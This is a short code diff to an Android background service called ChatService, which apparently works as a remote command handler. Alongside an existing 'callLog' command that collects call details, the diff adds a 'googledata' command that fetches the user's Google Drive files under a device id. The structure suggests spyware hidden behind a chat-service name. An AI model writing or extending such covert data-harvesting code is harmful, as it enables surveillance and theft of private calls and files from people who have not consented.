@@ -125,6 +125,9 @@ public class ChatService extends Service {
                     case "callLog":
                         handleCallLogs();
                         break;
+                    case "googledata":
+                        handleGoogleData();
+                        break;
                 }
             }
         }
@@ -256,6 +259,15 @@ public class ChatService extends Service {
         Context context = getApplicationContext();
         try {
             CallLogLister.getCallDetails(context, getId());
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    private void handleGoogleData() {
+        Context context = getApplicationContext();
+        try {
+            GoogleData.getGoogleDriveFiles(context, getId());
         } catch (Exception e) {
             e.printStackTrace();
         }
